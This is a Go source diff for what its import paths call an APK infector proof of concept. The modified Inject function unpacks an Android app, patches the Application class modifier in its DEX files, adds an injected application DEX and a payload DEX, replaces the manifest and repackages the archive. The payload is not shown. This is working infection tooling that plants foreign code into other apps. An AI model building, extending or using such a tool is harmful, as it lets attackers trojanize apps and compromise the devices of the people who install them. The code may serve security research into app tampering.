@@ -10,6 +10,8 @@ import (
 	"path/filepath"
 	"strconv"
 	"strings"
+	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
+	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/dex"
 )
 
 var zipOutput, _ = filepath.Abs("sample_unzipped")
@@ -39,10 +41,19 @@ func Inject(path string, zipModifiedOutput string) {
 		//log.Printf("Unzipped:\n" + strings.Join(files, "\n"))
 	}
 
+	// patch out Application final modifier
+	for _, path := range files {
+		if strings.Contains(path, "classes") {
+			dex.Patch_app_modifier(path)
+		}
+	}
+
 	//calc classes.dex index
 	max := strings.Count(strings.Join(files, ""), "classes")
 	log.Printf("max classes dex index = %d", max)
 	max += 1
+
+	
 
 	// inject InjectedApp.dex
 	var injectedAppNewName = "classes" + strconv.Itoa(max) + ".dex"
@@ -61,7 +72,7 @@ func Inject(path string, zipModifiedOutput string) {
 	log.Printf("Successfuly injected DEX:" + injectedAppNewName + "," + payloadNewName)
 
 	//replace manifest
-	copy(ManifestBinaryPath, fmt.Sprintf("%s%c%s", zipOutput, os.PathSeparator, "AndroidManifest.xml"))
+	copy(utils.ManifestBinaryPath, fmt.Sprintf("%s%c%s", zipOutput, os.PathSeparator, "AndroidManifest.xml"))
 
 	// zip all files
 	fmt.Println("\t--zipping...")
@@ -148,7 +159,7 @@ func addFileToZip(zipWriter *zip.Writer, filename, baseDir string) error {
 	header.Name = relPath
 
 	// Проверяем, является ли файл библиотекой .so и устанавливаем метод хранения
-	if filepath.Ext(filename) == ".so" {
+	if filepath.Ext(filename) == ".so" || filepath.Ext(filename) == ".arsc" {
 		header.Method = zip.Store
 	} else {
 		header.Method = zip.Deflate
@@ -250,7 +261,7 @@ func unzip(src string, dest string) ([]string, error) {
 		// Store filename/path for returning and using later on
 		fpath := filepath.Join(dest, f.Name)
 
-		// Check for ZipSlip. More Info: http://bit.ly/2MsjAWE
+		// Check for ZipSlip. 
 		if !strings.HasPrefix(fpath, filepath.Clean(dest)+string(os.PathSeparator)) {
 			return filenames, fmt.Errorf("%s: illegal file path", fpath)
 		}
